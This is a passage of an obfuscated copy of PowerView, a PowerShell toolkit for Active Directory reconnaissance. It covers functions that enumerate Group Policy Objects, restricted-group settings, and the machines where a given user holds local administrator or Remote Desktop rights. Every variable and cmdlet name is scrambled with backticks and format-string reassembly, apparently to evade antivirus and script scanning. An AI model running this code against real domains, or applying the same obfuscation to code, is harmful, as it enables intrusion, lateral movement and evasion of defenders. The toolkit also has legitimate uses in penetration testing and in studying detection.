                    ${u`SER} = &("{1}{0}{2}" -f 'i','Get-Doma','nUser') @SearcherArguments -FindOne | &("{2}{3}{1}{0}"-f 'ject','t-Ob','S','elec') -First 1
                    if(-not ${u`seR}) {
                        &("{4}{2}{0}{1}{3}"-f 'e-Ve','rbo','rit','se','W') "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    ${oB`JE`cTdN} = ${US`er}.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                ${O`BJECT`OUS} = @()
                ${o`BjEcT`o`US} += ${oB`j`ECt`dN}.split(',') | &("{1}{3}{4}{2}{0}" -f 't','Fo','Objec','rEa','ch-') {
                    if(${_}.startswith('OU=')) {
                        ${oBJec`T`dN}.SubString(${o`B`Ject`Dn}.IndexOf("$($_),"))
                    }
                }
                &("{1}{2}{0}"-f 'se','Write-','Verbo') "[Get-DomainGPO] object OUs: $ObjectOUs"

                if (${oB`ject`o`Us}) {
                    # find all the GPOs linked to the user/computer's OUs
                    ${SEARC`hERaRgu`M`enTS}.Remove('Properties')
                    ${iNHE`RITaN`CeD`I`S`ABlEd} = ${FA`l`se}
                    ForEach(${ObJe`ct`oU} in ${OB`Jec`TOuS}) {
                        ${SEArcher`ArGUm`E`N`Ts}['Identity'] = ${ob`j`ECtou}
                        ${GpoAd`spa`THS} += &("{0}{3}{1}{2}" -f'G','t-Domain','OU','e') @SearcherArguments | &("{0}{1}{2}"-f'ForEach-','O','bject') {
                            # extract any GPO links for this particular OU the computer is a part of
                            if (${_}.gplink) {
                                ${_}.gplink.split('][') | &("{3}{1}{0}{2}" -f 'Each-O','r','bject','Fo') {
                                    if (${_}.startswith('LDAP')) {
                                        ${pa`R`Ts} = ${_}.split(';')
                                        ${G`POdn} = ${pAR`Ts}[0]
                                        ${eNf`orc`ed} = ${paR`TS}[1]

                                        if (${I`Nh`ERITAn`C`Ed`IsaBleD}) {
                                            # if inheritance has already been disabled and this GPO is set as "enforced"
                                            #   then add it, otherwise ignore it
                                            if (${en`F`o`RcED} -eq 2) {
                                                ${G`p`OdN}
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            ${GP`odn}
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
                            if (${_}.gpoptions -eq 1) {
                                ${iN`He`RITAnCed`I`SableD} = ${TR`Ue}
                            }
                        }
                    }
                }

                if (${TArge`TCo`MpUT`eRn`Ame}) {
                    # find all the GPOs linked to the computer's site
                    ${CompUTe`RSI`TE} = (&("{6}{5}{4}{2}{3}{0}{1}"-f 'teN','ame','puterS','i','etCom','t-N','Ge') -ComputerName ${TaR`GeT`c`ompUTERnAMe}).SiteName
                    if(${coMPU`Te`Rs`I`TE} -and (${cOMPuTe`R`sI`TE} -notlike 'Error*')) {
                        ${SEAr`c`hERAr`Gu`mEnts}['Identity'] = ${cOM`P`U`TerSIte}
                        ${GPoAdS`p`ATHs} += &("{1}{3}{4}{2}{0}" -f 'te','Get-','mainSi','D','o') @SearcherArguments | &("{2}{1}{3}{0}"-f 'ect','orEa','F','ch-Obj') {
                            if(${_}.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                ${_}.gplink.split('][') | &("{1}{3}{4}{0}{2}" -f 'j','Fo','ect','rEach-O','b') {
                                    if (${_}.startswith('LDAP')) {
                                        ${_}.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer's domain
                ${obJe`c`T`DOMaIndn} = ${Obj`ecT`Dn}.SubString(${o`BJ`ecTDN}.IndexOf('DC='))
                ${seARcH`eRA`Rg`UME`Nts}.Remove('Identity')
                ${s`eArChEraRGu`m`E`Nts}.Remove('Properties')
                ${seaRcHE`R`AR`GUMENts}['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${Gpo`A`Ds`PATHs} += &("{0}{3}{1}{2}{4}"-f 'Get-D','e','c','omainObj','t') @SearcherArguments | &("{0}{4}{2}{1}{3}"-f 'F','bje','rEach-O','ct','o') {
                    if(${_}.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        ${_}.gplink.split('][') | &("{0}{1}{2}"-f 'ForEach','-','Object') {
                            if (${_}.startswith('LDAP')) {
                                ${_}.split(';')[0]
                            }
                        }
                    }
                }
                &("{3}{2}{1}{0}"-f 'bose','e-Ver','t','Wri') "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # restore the old properites to return, if set
                if (${o`LD`prO`PeRtI`ES}) { ${SEaRCherA`R`gUme`NTs}['Properties'] = ${o`lDPrO`pertiES} }
                else { ${SE`AR`c`He`RARg`UmentS}.Remove('Properties') }
                ${se`A`RC`HE`RAr`gumENTs}.Remove('Identity')

                ${G`pOaDSPAT`Hs} | &("{0}{1}{2}"-f'Whe','re-O','bject') {${_} -and (${_} -ne '')} | &("{3}{1}{0}{2}"-f 'ach-Ob','E','ject','For') {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    ${SeARCHe`RARG`UM`e`NTS}['SearchBase'] = ${_}
                    ${SEaRCHE`R`ARg`U`mEN`TS}['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    &("{1}{0}{3}{2}"-f 't','Ge','DomainObject','-') @SearcherArguments | &("{0}{3}{4}{1}{2}" -f 'ForE','h-','Object','a','c') {
                        if (${psb`oU`NDpAraMet`ErS}['Raw']) {
                            ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        ${_}
                    }
                }
            }
            else {
                ${IDe`Nt`ityfil`TEr} = ''
                ${F`ILTeR} = ''
                ${id`ent`itY} | &("{0}{1}{2}{3}" -f 'Where','-Ob','je','ct') {${_}} | &("{1}{2}{0}{3}"-f'ch-Obje','ForE','a','ct') {
                    ${I`D`e`NTItyiNsTA`N`CE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                    if (${Iden`T`ItyiNsTan`cE} -match 'LDAP://|^CN=.*') {
                        ${I`D`Ent`ITYF`Ilter} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${Ps`B`o`UNdpAr`AmE`TERS}['Domain']) -and (-not ${p`sBoU`N`dpar`AME`Ters}['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            ${iD`EntitYd`OM`AIN} = ${iD`ENTITyIn`stA`Nce}.SubString(${i`d`eNTITyIn`s`TAncE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{1}{0}"-f'se','ite-Verbo','Wr') "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            ${SE`Ar`chErAR`GUMEn`TS}['Domain'] = ${i`Den`TitYDo`m`AiN}
                            ${Gp`OSEaR`c`HeR} = &("{1}{2}{3}{0}" -f 'archer','Get-D','om','ainSe') @SearcherArguments
                            if (-not ${gPoSE`AR`Ch`Er}) {
                                &("{3}{1}{0}{2}"-f'-W','te','arning','Wri') "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif (${ID`ENtitYINSt`A`Nce} -match '{.*}') {
                        ${iDEN`TItY`Fil`TeR} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${guiDBY`T`es`T`RINg} = (-Join (([Guid]${ID`ENTiT`yiNSt`AN`CE}).ToByteArray() | &("{1}{3}{0}{2}"-f 'ec','For','t','Each-Obj') {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            ${iDEn`TITyF`IL`TER} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${i`dENt`it`yfIL`Ter} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${IDeNtity`FILt`er} -and (${I`den`TityFi`lTEr}.Trim() -ne '') ) {
                    ${f`I`LteR} += "(|$IdentityFilter)"
                }

                if (${PsbO`UN`dpaRa`me`TeRS}['LDAPFilter']) {
                    &("{2}{0}{1}" -f 'rb','ose','Write-Ve') "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    ${fi`lTEr} += "$LDAPFilter"
                }

                ${g`poSEARCH`Er}.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{1}{2}{3}{0}"-f 'e','Wri','te-Verbo','s') "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if (${PS`BO`Un`DpaRAme`TerS}['FindOne']) { ${Re`SUl`TS} = ${Gpos`e`ARCHeR}.FindOne() }
                else { ${ReS`UL`TS} = ${gPOS`ea`Rcher}.FindAll() }
                ${re`S`UltS} | &("{2}{0}{1}"-f'e-O','bject','Wher') {${_}} | &("{2}{0}{1}" -f 'jec','t','ForEach-Ob') {
                    if (${psBOU`Ndpar`AM`ETerS}['Raw']) {
                        # return raw result objects
                        ${g`PO} = ${_}
                        ${G`Po}.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if (${Ps`BO`UNd`Pa`Ra`METerS}['SearchBase'] -and (${se`Arch`BAsE} -Match '^GC://')) {
                            ${G`Po} = &("{2}{0}{3}{1}" -f 'nvert-LDAPPr','rty','Co','ope') -Properties ${_}.Properties
                            try {
                                ${gP`OdN} = ${g`pO}.distinguishedname
                                ${Gpo`DOm`AIN} = ${Gp`odN}.SubString(${g`P`OdN}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                ${Gpc`Fi`LESYSpA`Th} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${g`po} | &("{2}{0}{1}" -f'-Memb','er','Add') ("{2}{0}{3}{1}"-f'te','rty','No','prope') 'gpcfilesyspath' ${gpCfiles`Y`s`PaTH}
                            }
                            catch {
                                &("{2}{3}{1}{0}"-f'ose','Verb','Write','-') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            ${g`Po} = &("{5}{2}{1}{3}{4}{0}" -f'y','e','Prop','r','t','Convert-LDAP') -Properties ${_}.Properties
                        }
                        ${G`pO}.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    ${g`po}
                }
                if (${R`eS`ULts}) {
                    try { ${RE`sUltS}.dispose() }
                    catch {
                        &("{3}{2}{0}{1}"-f 'b','ose','-Ver','Write') "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                ${g`pOS`e`ArchER}.dispose()
            }
        }
    }
}


function GE`T-DO`Maing`pO`L`o`Ca`LgROuP {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups'
or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO with the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup 'Desktops'

Return any GPO-set groups for the GPO with the given display name.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOLocalGroup -Credential $Cred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${iDe`NTI`TY},

        [Switch]
        ${re`sOLv`Eme`mberstOs`iDs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`m`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`dap`FiLT`Er},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEa`Rch`BASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RvER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`E`ARCHsCOPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rESu`ltpaGe`S`i`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErv`e`R`TIMElIM`IT},

        [Switch]
        ${TO`m`BsT`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REd`e`NtIAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SE`ArCHE`R`ARgum`en`TS} = @{}
        if (${pSb`OunDpArA`METe`Rs}['Domain']) { ${SeA`RcheR`A`RGUmeNts}['Domain'] = ${DoMa`iN} }
        if (${p`SBoUNdPa`RAMEt`ErS}['LDAPFilter']) { ${sEAr`CHeRA`R`gU`menTs}['LDAPFilter'] = ${DoMA`iN} }
        if (${ps`BOuN`d`PA`RaMeTers}['SearchBase']) { ${s`e`Ar`ChErARGUm`EN`Ts}['SearchBase'] = ${S`EARcH`BAsE} }
        if (${pSBoUNDP`A`RAm`ETeRS}['Server']) { ${SEa`RcHe`Ra`RGUm`EnTs}['Server'] = ${sERV`er} }
        if (${PSB`ouNd`p`ARAMEters}['SearchScope']) { ${sEa`R`chE`RaRGUMENts}['SearchScope'] = ${Searc`HS`CO`PE} }
        if (${PsBoun`dPar`AmE`TeRS}['ResultPageSize']) { ${SEa`RCHeRaRg`Um`E`N`TS}['ResultPageSize'] = ${Re`sU`LTPAg`eSIzE} }
        if (${P`sbou`NDpAram`eTeRs}['ServerTimeLimit']) { ${s`eA`RCHE`Ra`RGuMeNTS}['ServerTimeLimit'] = ${servERT`I`mE`L`imIt} }
        if (${psBOu`N`dPaR`Am`Eters}['Tombstone']) { ${SEAr`cHeRAR`G`UMEntS}['Tombstone'] = ${toMbS`TO`Ne} }
        if (${PsbouN`dPA`R`AmeT`e`RS}['Credential']) { ${S`ear`CHeRAr`gUMEnTS}['Credential'] = ${CrE`De`NTIAl} }

        ${c`ONvEr`TArguM`E`NTS} = @{}
        if (${P`Sbou`Nd`pa`RA`meteRS}['Domain']) { ${CON`Vert`Arg`Umen`Ts}['Domain'] = ${D`o`mAiN} }
        if (${Psbou`NdpaRaMe`T`E`Rs}['Server']) { ${conVErt`ARg`UmE`NtS}['Server'] = ${sE`RVeR} }
        if (${Ps`BOu`N`DpArAmeTeRs}['Credential']) { ${ConV`eR`TaRGUME`Nts}['Credential'] = ${cr`E`DeNTiAL} }

        ${s`pl`itO`PTioN} = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if (${PsbOUnD`pAr`Am`e`TE`RS}['Identity']) { ${se`Archer`A`RGuments}['Identity'] = ${idE`N`TiTY} }

        &("{1}{3}{0}{2}"-f'n','Get','GPO','-Domai') @SearcherArguments | &("{4}{1}{0}{2}{3}"-f'ch','a','-Obje','ct','ForE') {
            ${G`PoDisP`la`YNAme} = ${_}.displayname
            ${gp`o`NaMe} = ${_}.name
            ${GpO`PaTH} = ${_}.gpcfilesyspath

            ${p`Ar`SeARgS} =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if (${P`S`BOunDparAm`EtE`Rs}['Credential']) { ${pAR`sEaR`gs}['Credential'] = ${CREde`Nt`IAL} }

            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists
            ${I`Nf} = &("{0}{2}{1}{3}"-f 'G','GptTmp','et-','l') @ParseArgs

            if (${i`Nf} -and (${i`NF}.psbase.Keys -contains 'Group Membership')) {
                ${ME`MbeR`sH`IPS} = @{}

                # parse the members/memberof fields for each entry
                ForEach (${ME`mB`eRS`hIp} in ${I`Nf}.'Group Membership'.GetEnumerator()) {
                    ${Gr`OuP}, ${ReL`AtiON} = ${Me`MBe`R`ShIp}.Key.Split('__', ${sPL`ItOp`T`IoN}) | &("{3}{2}{0}{1}" -f'h-Obje','ct','rEac','Fo') {${_}.Trim()}
                    # extract out ALL members
                    ${M`Em`BEr`Sh`iPvAluE} = ${mEMBERS`h`iP}.Value | &("{2}{0}{1}" -f 'e-Objec','t','Wher') {${_}} | &("{1}{3}{2}{0}{4}"-f 'ch-O','For','a','E','bject') { ${_}.Trim('*') } | &("{0}{3}{1}{2}"-f'Whe','Obje','ct','re-') {${_}}

                    if (${pSB`Ou`N`DpaRam`eTerS}['ResolveMembersToSIDs']) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        ${GRo`U`pmemB`ers} = @()
                        ForEach (${me`MBEr} in ${MEmBEr`S`hi`PvA`lue}) {
                            if (${mE`MbER} -and (${mE`MB`er}.Trim() -ne '')) {
                                if (${Me`mBer} -notmatch '^S-1-.*') {
                                    ${C`OnVe`Rtt`oA`Rg`UMENts} = @{'ObjectName' = ${M`eMber}}
                                    if (${pSBO`UND`PArAmE`T`e`Rs}['Domain']) { ${cO`NVertTo`AR`g`UmEntS}['Domain'] = ${d`om`AIn} }
                                    ${MembEr`s`Id} = &("{0}{2}{1}" -f'Convert','SID','To-') @ConvertToArguments

                                    if (${m`Ember`siD}) {
                                        ${g`ROupMeMbe`RS} += ${MEmb`Er`S`Id}
                                    }
                                    else {
                                        ${g`R`oUpm`embeRs} += ${Me`m`BEr}
                                    }
                                }
                                else {
                                    ${Gro`Upme`Mb`ers} += ${mE`MbEr}
                                }
                            }
                        }
                        ${Me`MB`ERs`hipval`Ue} = ${gR`oUP`memBe`Rs}
                    }

                    if (-not ${mEM`BeRsHi`PS}[${G`Roup}]) {
                        ${m`EMb`erShIPs}[${GRO`UP}] = @{}
                    }
                    if (${meMb`eR`ShiPva`lue} -isnot [System.Array]) {${ME`mb`ERSHip`V`ALUE} = @(${m`EMber`SHiPV`ALuE})}
                    ${memB`Er`ShiPs}[${g`ROUP}].Add(${rEl`ATi`On}, ${m`eMbe`RsHiP`VAluE})
                }

                ForEach (${M`eM`Bers`hiP} in ${MeMBe`RSH`iPs}.GetEnumerator()) {
                    if (${mem`Bers`HIP} -and ${ME`m`Be`RSHiP}.Key -and (${MEMBe`R`shIP}.Key -match '^\*')) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        ${GRouP`sid} = ${memb`ERSh`Ip}.Key.Trim('*')
                        if (${GR`oUPS`iD} -and (${Gr`O`UPSiD}.Trim() -ne '')) {
                            ${gR`o`UPNamE} = &("{2}{3}{1}{0}"-f '-SID','rtFrom','C','onve') -ObjectSID ${GrO`Up`sID} @ConvertArguments
                        }
                        else {
                            ${g`R`OuPnAMe} = ${Fa`LSE}
                        }
                    }
                    else {
                        ${g`R`oUPna`me} = ${MeMbeR`S`H`IP}.Key

                        if (${g`ROU`pN`AME} -and (${GR`O`UpnAMe}.Trim() -ne '')) {
                            if (${gRO`UPnA`mE} -match 'Administrators') {
                                ${gRO`U`psiD} = 'S-1-5-32-544'
                            }
                            elseif (${grouP`N`AmE} -match 'Remote Desktop') {
                                ${g`Roup`Sid} = 'S-1-5-32-555'
                            }
                            elseif (${GR`O`UpnAME} -match 'Guests') {
                                ${Gr`o`U`pSID} = 'S-1-5-32-546'
                            }
                            elseif (${G`RoUpNa`me}.Trim() -ne '') {
                                ${COnve`RtTo`A`RGUMe`N`TS} = @{'ObjectName' = ${G`RO`UPNa`me}}
                                if (${psB`O`UN`dPaR`AMeteRs}['Domain']) { ${cO`NVErTto`Arg`UM`E`NTS}['Domain'] = ${Do`ma`iN} }
                                ${g`RouPs`iD} = &("{1}{0}{2}"-f 'nv','Co','ertTo-SID') @ConvertToArguments
                            }
                            else {
                                ${gR`o`UPSiD} = ${n`ULL}
                            }
                        }
                    }

                    ${g`Pogr`oup} = &("{1}{2}{0}"-f 't','New-','Objec') ("{0}{1}{2}"-f'PSO','b','ject')
                    ${GpOGR`O`UP} | &("{1}{2}{0}" -f'd-Member','A','d') ("{3}{2}{0}{1}" -f'per','ty','o','Notepr') 'GPODisplayName' ${GpO`DiSPlA`YnA`ME}
                    ${gp`OGRO`Up} | &("{1}{0}{2}"-f'embe','Add-M','r') ("{2}{0}{1}{3}"-f'eproper','t','Not','y') 'GPOName' ${g`p`ONamE}
                    ${gp`O`GrOup} | &("{2}{1}{0}" -f 'mber','d-Me','Ad') ("{3}{0}{1}{2}"-f 'epr','oper','ty','Not') 'GPOPath' ${GPO`Pa`Th}
                    ${g`p`oGROup} | &("{0}{2}{1}{3}" -f'A','Me','dd-','mber') ("{1}{2}{0}{3}"-f 'epro','No','t','perty') 'GPOType' 'RestrictedGroups'
                    ${gpOg`Ro`Up} | &("{0}{1}{2}" -f 'Add-Memb','e','r') ("{2}{0}{1}"-f 'pro','perty','Note') 'Filters' ${n`Ull}
                    ${g`pOgrOuP} | &("{2}{1}{0}"-f 'Member','dd-','A') ("{0}{2}{1}"-f'Not','property','e') 'GroupName' ${GRou`p`NA`me}
                    ${gPOGr`OUP} | &("{2}{1}{0}" -f'mber','-Me','Add') ("{1}{2}{0}"-f'roperty','N','otep') 'GroupSID' ${GRou`p`S`Id}
                    ${gpo`gRO`Up} | &("{1}{2}{0}" -f 'er','A','dd-Memb') ("{2}{3}{0}{1}"-f 'pert','y','Notepr','o') 'GroupMemberOf' ${mEm`B`eRsh`Ip}.Value.Memberof
                    ${g`pOG`RO`Up} | &("{3}{0}{1}{2}" -f 'dd-','Mem','ber','A') ("{0}{1}{2}{3}"-f 'No','t','e','property') 'GroupMembers' ${ME`m`BeRs`hIP}.Value.Members
                    ${GPO`G`R`OuP}.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    ${g`P`ogrOup}
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            ${pa`Rs`eArGS} =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{0}{1}{3}{2}" -f 'Get-Gr','ou','L','psXM') @ParseArgs | &("{2}{0}{1}" -f'ch-','Object','ForEa') {
                if (${PS`BoUndP`ARaME`Ters}['ResolveMembersToSIDs']) {
                    ${GRouPMe`Mbe`RS} = @()
                    ForEach (${me`mb`er} in ${_}.GroupMembers) {
                        if (${MEmB`er} -and (${m`eM`BER}.Trim() -ne '')) {
                            if (${ME`m`BeR} -notmatch '^S-1-.*') {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                ${c`oNVerTt`OARgUm`Ents} = @{'ObjectName' = ${g`Rou`P`NaMe}}
                                if (${psBou`NdpAR`AM`e`TERS}['Domain']) { ${Co`NVert`TO`A`R`gUmenTS}['Domain'] = ${d`OmA`In} }
                                ${MemBe`RS`Id} = &("{2}{3}{1}{0}"-f'SID','vertTo-','Co','n') -Domain ${Dom`A`in} -ObjectName ${memb`eR}

                                if (${mEmbER`s`ID}) {
                                    ${GRoUpmEmB`e`Rs} += ${ME`MBeR`Sid}
                                }
                                else {
                                    ${grO`UPM`EmBE`Rs} += ${MeM`B`er}
                                }
                            }
                            else {
                                ${GRoUPM`eM`B`E`Rs} += ${mem`BeR}
                            }
                        }
                    }
                    ${_}.GroupMembers = ${g`RoupmEmBe`Rs}
                }

                ${_} | &("{0}{2}{3}{1}"-f'Add-Me','er','m','b') ("{1}{0}{3}{2}" -f 'te','No','roperty','p') 'GPODisplayName' ${gpO`DispL`A`yN`Ame}
                ${_} | &("{3}{1}{2}{0}" -f'er','M','emb','Add-') ("{3}{2}{1}{0}"-f 'erty','teprop','o','N') 'GPOName' ${gpo`N`AME}
                ${_} | &("{1}{0}{2}" -f 'dd-Mem','A','ber') ("{2}{0}{1}"-f 'oteproper','ty','N') 'GPOType' 'GroupPolicyPreferences'
                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                ${_}
            }
        }
    }
}


function gET-DoM`A`InGPOUs`eR`L`Oc`AlGR`OUp`mAp`Ping {
<#
.SYNOPSIS

Enumerates the machines where a specific domain user/group is a member of a specific
local group, all through GPO correlation. If no user/group is specified, all
discoverable mappings are returned.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  

.DESCRIPTION

Takes a user/group name and optional domain, and determines the computers in the domain
the user/group has local admin (or RDP) rights to.

It does this by:
    1.  resolving the user/group to its proper SID
    2.  enumerating all groups the user/group is a current part of
        and extracting all target SIDs to build a target SID list
    3.  pulling all GPOs that set 'Restricted Groups' or Groups.xml by calling
        Get-DomainGPOLocalGroup
    4.  matching the target SID list to the queried GPO SID list
        to enumerate all GPO the user is effectively applied with
    5.  enumerating all OUs and sites and applicable GPO GUIs are
        applied to through gplink enumerating
    6.  querying for all computers under the given OUs or sites

If no user/group is specified, all user/group -> machine mappings discovered through
GPO relationships are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the user/group to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping

Find all user/group -> machine relationships where the user/group is a member
of the local administrators group on target machines.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local

Find all computers that dfm user has local administrator rights to in
the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential $Cred

.OUTPUTS

PowerView.GPOLocalGroupMapping

A custom PSObject containing any target identity information and what local
group memberships they're a part of through GPO correlation.

.LINK

http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${id`eN`T`ITy},

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        ${LOC`Al`GROUp} = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEarCH`B`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ErvEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`ArcHS`cO`pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`S`U`LtpaG`ESIze} = 200,

